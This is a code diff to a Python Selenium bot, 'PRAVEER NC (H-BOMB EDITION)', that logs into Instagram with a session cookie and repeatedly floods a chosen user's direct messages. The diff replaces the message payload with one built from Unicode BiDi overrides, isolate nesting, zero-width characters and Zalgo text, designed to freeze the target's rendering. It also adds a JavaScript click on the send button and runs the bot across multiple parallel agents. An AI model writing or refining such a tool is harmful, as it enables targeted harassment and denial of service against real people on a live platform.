@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (COUNTER-BLITZ V100)
-# 📅 STATUS: SCREEN-CLEARER | GPU-POISON | 0.05s BURST
+# 🚀 PROJECT: PRAVEER NC (H-BOMB EDITION)
+# 📅 STATUS: BiDi-OVERLOAD | DOUBLE-TAP SEND | 10 AGENTS
 
 import os, time, random, threading, sys, gc, tempfile, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -14,32 +14,32 @@ THREADS = 2
 SESSION_LIMIT = 180 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_counter_blitz_payload(target_name):
-    """The Anti-Spammer Payload: Hijacks the target's UI focus."""
-    # 💥 PHASE 1: THE SCREEN-CLEARER
-    # 80 lines of space to push their spam out of view instantly.
-    clearer = "\n" * 80 
+def get_h_bomb_payload(target_name):
+    """The H-BOMB: BiDi-Marker Overload & Horizontal Complexity."""
+    header = f"👑 PRAVEER PAPA 👑 KERNEL PANIC: [{target_name.upper()}] SHUTDOWN\n"
     
-    header = f"👑 PRAVEER PAPA 👑 COUNTER-BLITZ: [{target_name.upper()}] SHUTDOWN\n"
+    # 💥 THE 'BiDi-BOMB' (Directional Markers + Variation Selectors)
+    # This forces the layout engine to flip rendering every character.
+    bidi_mix = ""
+    for char in f"SYSTEM_FAILURE_{target_name.upper()}_VOID_":
+        bidi_mix += f"\u202E{char}\u202D\ufe0f"
     
-    # 💥 PHASE 2: GPU-POISON (Math Overlays + Variation Selectors)
-    # Lags the keyboard and rendering engine.
-    gpu_freeze = "𝔓𝔄𝔙𝔈𝔈𝔔 \ufe0f" * 40 
+    # 💥 THE 'LAYOUT THRASHER' (Non-Breaking Spaces + ZWJ)
+    # Prevents 'lazy-loading'; forces the browser to render as one atomic unit.
+    thrash = "\u200D\u00A0\u2060" * 300
     
-    # 💥 PHASE 3: DOM-LOCK (256-Layer Isolate Nesting)
-    # Freezes the 'Send' button and UI interactions.
-    dom_lock = "\u2066\u2067\u2068" * 85 
+    # 💥 THE 'RECURSION VOID' (Isolate Nesting)
+    void = "\u2066\u2067\u2068" * 80 
+
+    lines = [header, thrash, void]
     
-    # 💥 PHASE 4: SKYSCRAPER (High-Density Zalgo)
-    z_tower = "̸" * 100
+    # 💥 THE 'SKYSCRAPER 2.0' (Fraktur Script + Deep Zalgo)
+    for i in range(50):
+        # Alternate LTR/RTL prefixes to destroy the scroll-sync logic
+        prefix = "\u202E" if i % 2 == 0 else "\u202D"
+        lines.append(f"{prefix} 𝔓𝔄𝔙𝔈𝔈𝔔_OWNED ̸" * 15 + "̸" * 65)
     
-    lines = [clearer, header, gpu_freeze, dom_lock]
-    for i in range(45):
-        style = "\u202E" if i % 2 == 0 else "\u202D"
-        lines.append(f"{style} {target_name.upper()}_MUTED {z_tower}")
-    
-    bloat = "\u200B" * 2500
-    return "\n".join(lines) + bloat
+    return "\n".join(lines)[:9950]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -49,18 +49,21 @@ def get_driver(agent_id):
     chrome_options.add_argument("--disable-gpu")
     chrome_options.add_argument("--window-size=1920,1080")
     chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+    
+    temp_dir = os.path.join(tempfile.gettempdir(), f"hbomb_{MACHINE_ID}_{agent_id}")
+    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
     return webdriver.Chrome(options=chrome_options)
 
 def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ COUNTER-BLITZ DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ H-BOMB DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(6)
+            time.sleep(7)
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
             time.sleep(12)
 
@@ -69,19 +72,33 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                     
-                    # 🔥 ZERO-DELAY BURST: 5 Heavy Messages in a row
-                    for _ in range(5):
-                        payload = get_counter_blitz_payload(target_name)
+                    for _ in range(3): # Burst wave of 3
+                        payload = get_h_bomb_payload(target_name)
+                        
+                        # 💥 DOUBLE-TAP SEND LOGIC
+                        # 1. Inject via execCommand (fastest)
                         driver.execute_script("""
                             var el = arguments[0];
                             document.execCommand('insertText', false, arguments[1]);
                             el.dispatchEvent(new Event('input', { bubbles: true }));
                         """, box, payload)
+                        
+                        time.sleep(0.5)
+                        
+                        # 2. Click the 'Send' button directly via JavaScript
+                        driver.execute_script("""
+                            var btns = document.querySelectorAll('div[role="button"]');
+                            for(var b of btns) {
+                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
+                                    b.click();
+                                }
+                            }
+                        """)
+                        # 3. Backup Enter key
                         box.send_keys(Keys.ENTER)
-                        time.sleep(0.05) # Extreme speed
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 SHUTDOWN DELIVERED", flush=True)
-                    time.sleep(random.uniform(8, 12)) 
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 H-BOMB IMPACT DELIVERED", flush=True)
+                    time.sleep(random.uniform(10, 15)) 
                     
                 except:
                     time.sleep(5)
